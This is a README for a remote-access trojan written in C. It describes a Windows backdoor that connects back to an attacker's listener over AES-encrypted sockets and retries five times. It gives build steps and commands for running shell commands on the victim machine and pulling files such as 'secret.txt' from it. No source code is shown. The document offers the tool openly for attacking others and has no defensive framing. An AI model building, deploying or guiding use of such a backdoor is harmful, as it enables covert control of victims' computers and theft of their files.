# simple RAT in c

+ data is encrypted with AES-256-CBC
+ encryption implementation is taken from https://github.com/kokke/tiny-AES-c

+ change IP and port inside backdoor.c and server.c
+ compile executable with ./build.sh (need to install mingw and gcc beforehand)
+ run server to listen on attacking machine for reverse shell

backdoor.exe will attempt to connect to attacker 5 times, with a 10 second pause in between.

Usage:
  + !exit to exit shell and close socket
  + !l(lowercase L) followed by any commands to run local commands(for example !l whoami or !lwhoami will run commands on attacker's machine)
  + !get followed by filename to download files from victim to attacker(for example !get secret.txt)
  + other commands will be interpreted as shell commands on victim machine

still developing <3
